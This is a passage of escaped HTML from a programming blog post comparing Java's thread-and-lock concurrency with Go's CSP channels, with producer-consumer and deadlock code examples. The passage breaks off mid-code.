punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; item &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Math&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                queue&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Produce : &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                con&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                lock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;unlock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            producer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; consumer &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                lock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;lock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;queue&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                        con&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;await&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;InterruptedException&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token keyword&quot;&gt;var&lt;/span&gt; item &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; queue&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;remove&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Consume : &quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                con&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;signal&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                lock&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;unlock&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            consumer&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The producer produces an item and passes it to the queue, and the consumer consumes the item from the queue. Every time the producer or consumer access the queue, it must acquire Lock first. So only one thread can access the queue at the same time.&lt;br&gt;
Almost all program languages support Lock, so this paradigm can be applied widely.&lt;br&gt;
But it&#39;s difficult to use Thread &amp;amp; Lock to get right, you may accidentally fail into deadlock, see follow code:&lt;/p&gt;
&lt;pre class=&quot;language-java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; cacheLock &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; tableLock &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;oneMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;synchronized&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cacheLock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;synchronized&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;tableLock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;hio1&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;anotherMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;synchronized&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;tableLock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token keyword&quot;&gt;synchronized&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cacheLock&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token class-name&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;out&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;println&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;hio2&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;            &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt;  &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; args&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token function&quot;&gt;oneMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token function&quot;&gt;anotherMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;&lt;br&gt;        &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Thread&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token function&quot;&gt;anotherMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;                &lt;span class=&quot;token function&quot;&gt;oneMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;start&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Threads in line 20 and 25 wait for each other&#39;s Lock, and the whole process will block forever.&lt;br&gt;
What&#39;s more, deadlock is not obvious in most cases. Think above code, what if &lt;strong&gt;oneMethod&lt;/strong&gt; and &lt;strong&gt;anotherMethod&lt;/strong&gt; are provided by a third party, you don&#39;t know the behavior inside these two methods, you don&#39;t know how they use Lock until you trace source code, so you may probably use these two methods in the wrong way that could cause deadlock.&lt;/p&gt;
&lt;h1 id=&quot;communicating-sequential-process(csp)&quot;&gt;&lt;a class=&quot;direct-link&quot; href=&quot;#communicating-sequential-process(csp)&quot;&gt;#&lt;/a&gt; Communicating Sequential Process(CSP)&lt;/h1&gt;
&lt;p&gt;Compare to Thread &amp;amp; Lock paradigm that communicates by sharing memory, CSP paradigm encourages to share by communicating, every thread sends/receives the message to/from each other. Looks like:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tech-blog.cymetrics.io/img/posts/genchilu/concurrency_paradigms_golang_and_Java/csp.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;And Golang&#39;s concurrency paradigm&#39;s design principle is base on CSP. &lt;a href=&quot;https://go.dev/blog/codelab-share&quot;&gt;Golang&#39;s offical blog&lt;/a&gt; means:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Do not communicate by sharing memory; instead, share memory by communicating.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Also, you can see the comment in the document of Golang Sync package:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Package sync provides basic synchronization primitives such as mutual exclusion locks. Other than the Once and WaitGroup types, most are intended for use by low-level library routines. Higher-level synchronization is better done via channels and communication.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;So the implementation of producer-comsumer problem in Golang would like:&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;	queue &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;make&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;chan&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token comment&quot;&gt;// producer&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			item &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; rand&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Intn&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;			fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Produce: %d\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;			queue &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt; item&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token comment&quot;&gt;// consumer&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;			item &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;queue&lt;br&gt;			fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Consume: %d\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Developers can easily use channel without caring about the sophisticated mutex. In the aspect of high level, Golang decouples goroutines by channel instead of coupling all threads together by share memory, like Java using Thread &amp;amp; Lock.&lt;br&gt;
But that does cost - Golang&#39;s channel does not pass the original item, instead, channel would copy items from/to the sender/receiver. You may check with the following code:&lt;/p&gt;
&lt;pre class=&quot;language-go&quot;&gt;&lt;code class=&quot;language-go&quot;&gt;	&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		item &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; rand&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Intn&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Produce item Addr: %v\n&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt;item&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;		queue &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt; item&lt;br&gt;	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;br&gt;&lt;br&gt;	&lt;span class=&quot;token keyword&quot;&gt;go&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;func&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;&lt;br&gt;		item &lt;span class=&quot;token operator&quot;&gt;:=&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;-&lt;/span&gt;queue&lt;br&gt;		fmt&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;Printf&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Consume item Addr: 